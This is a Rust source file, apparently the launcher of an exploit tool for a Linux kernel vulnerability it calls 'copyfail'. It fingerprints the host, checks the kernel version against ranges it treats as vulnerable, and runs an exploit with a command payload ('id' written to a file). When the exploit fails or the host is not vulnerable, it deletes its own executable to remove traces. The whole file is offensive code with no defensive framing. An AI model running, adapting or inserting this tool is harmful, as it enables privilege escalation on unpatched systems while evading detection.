mod copyfail;

use std::{env, fs, io};
use std::path::Path;
use sysinfo::System;
use crate::copyfail::exp::run_exploit;

fn main() {
    let debug = true;

    let os_name = System::name()
        .unwrap_or_default()
        .to_lowercase();

    let kernel_ver = System::kernel_version().unwrap_or_default();

    if debug {
        println!("System name:             {:?}", System::name());
        println!("System kernel version:   {:?}", kernel_ver);
        println!("System OS version:       {:?}", System::os_version());
        println!("System host name:        {:?}", System::host_name());
    }

    let exe_path = match env::current_exe() {
        Ok(x) => x,
        Err(_e) => {
            std::process::exit(0);
        }
    };

    if os_name.contains("linux") {
        if debug {
            println!("[DEBUG] Linux detected. Checking kernel patch level...");
        }

        if is_vulnerable_to_copyfail(&kernel_ver) {
            if debug {
                println!("System is vulnerable.");
            }

            let payload = "id > /home/system/id.txt";
            run_exploit(payload.to_string()).unwrap_or_else(|e| {
                if debug {
                    println!("[EXPLOIT] Failed to exploit. {}", e);
                }
                cleanup_file(&exe_path).unwrap_or_else(|_| std::process::exit(0));
            });
        } else {
            cleanup_file(&exe_path).unwrap_or_else(|_| std::process::exit(0));
        }
    } else {
        cleanup_file(&exe_path).unwrap_or_else(|_| std::process::exit(0));
    }
}

fn is_vulnerable_to_copyfail(version: &str) -> bool {
    let clean_version = version.split('-').next().unwrap_or(version);
    let parts: Vec<&str> = clean_version.split('.').collect();

    if parts.len() < 3 {
        return false;
    }

    let major: u32 = parts[0].parse().unwrap_or(0);
    let minor: u32 = parts[1].parse().unwrap_or(0);
    let patch: u32 = parts[2].parse().unwrap_or(0);

    match (major, minor) {
        (4, 14..=20) => true,
        (5, 0..=9) => true,
        (5, 10) => patch < 254,
        (5, 11..=14) => true,
        (5, 15) => patch < 204,
        (5, 16..=19) => true,
        (6, 0) => true,
        (6, 1) => patch < 170,
        (6, 2..=5) => true,
        (6, 6) => patch < 137,
        (6, 7..=11) => true,
        (6, 12) => patch < 85,
        _ => false,
    }
}


fn cleanup_file(path: &Path) -> io::Result<()> {
    match fs::remove_file(path) {
        Ok(()) => {
            Ok(())
        }
        Err(err) if err.kind() == io::ErrorKind::NotFound => Ok(()),
        Err(err) => Err(err),
    }
}